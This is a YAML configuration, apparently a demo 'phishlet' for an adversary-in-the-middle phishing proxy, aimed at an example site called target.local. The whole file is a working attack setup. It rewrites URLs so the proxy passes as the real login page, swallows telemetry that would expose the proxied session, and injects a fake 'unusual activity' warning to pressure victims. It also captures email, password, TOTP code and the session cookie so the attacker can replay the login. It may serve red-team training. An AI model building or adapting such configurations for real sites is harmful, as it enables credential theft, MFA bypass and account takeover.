name: form-login
author: demo
version: "1"

# Attacks the form-based login of the target-site example (examples/target-site/).
# Demonstrates: sub_filters, force_post, intercept, js_inject, auth_tokens
# type: cookie, credentials type: post, and custom credential capture (MFA code).

proxy_hosts:
  - phish_sub: login
    orig_sub:  login
    domain:    target.local
    is_landing: true
    upstream_scheme: https

sub_filters:
  # Rewrite absolute URLs that include the scheme.
  - hostname:   login.target.local
    mime_types: [text/html, text/javascript, application/javascript]
    search:     'https://login\.target\.local'
    replace:    'https://{hostname}'

  # Rewrite any remaining bare domain references (e.g. in href="//target.local/..."
  # or plain text) in both HTML and JavaScript responses.
  - hostname:   login.target.local
    mime_types: [text/html, text/javascript, application/javascript]
    search:     target\.local
    replace:    '{domain}'

force_post:
  # The server requires login_source=web to distinguish browser logins from API
  # logins. The original form includes it as a hidden field, but sub_filters or
  # JS execution issues during proxying can cause it to be missing or mangled.
  # force_post ensures the param is always present before forwarding upstream.
  - path: "^/login$"
    conditions:
      - key:    "^email$"
        search: "^.+$"
    params:
      - key:   login_source
        value: web

intercept:
  # The target site's JS sends browser telemetry on page load. If forwarded
  # through the proxy, the server logs fingerprint data that could reveal the
  # proxied session (mismatched IP, unusual TLS fingerprint, etc.). Intercept
  # swallows the request and returns a success response without forwarding.
  - path:         "^/api/telemetry$"
    status:       200
    content_type: application/json
    body:         '{"status":"ok"}'

js_inject:
  # Inject a fake security notice inside the login card to add urgency. Uses the
  # same Tailwind classes as the page's own alert banners so it looks native.
  - trigger_domain: login.target.local
    trigger_path:   "^/login"
    script: |
      (function() {
        var form = document.querySelector("form");
        if (!form) return;
        var d = document.createElement("div");
        d.className = "bg-amber-50 border border-amber-200 text-amber-700 text-sm rounded-lg px-3 py-2.5 mb-4 flex items-start gap-2";
        d.innerHTML = '<svg class="w-4 h-4 mt-0.5 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.168 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625L8.485 2.495zM10 6a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"/></svg><span>Unusual activity detected on your account. Please verify your identity to continue.</span>';
        form.insertBefore(d, form.firstChild);
      })();

auth_tokens:
  - domain: ".target.local"
    keys:
      - name: auth_session
        required: true

credentials:
  username:
    key:    "^email$"
    search: "^(.+)$"
    type:   post
  password:
    key:    "^password$"
    search: "^(.+)$"
    type:   post
  custom:
    # Capture the MFA code submitted to /mfa — a key goal of AiTM attacks is
    # obtaining the OTP before it expires so the attacker can replay the session.
    - name:   totp_code
      key:    "^code$"
      search: "^(.+)$"
      type:   post

login:
  path: /login
  domain: login.target.local
  # No path restriction on domain — credential rules fire on any POST to the
  # login domain, covering both /login (email+password) and /mfa (totp_code).
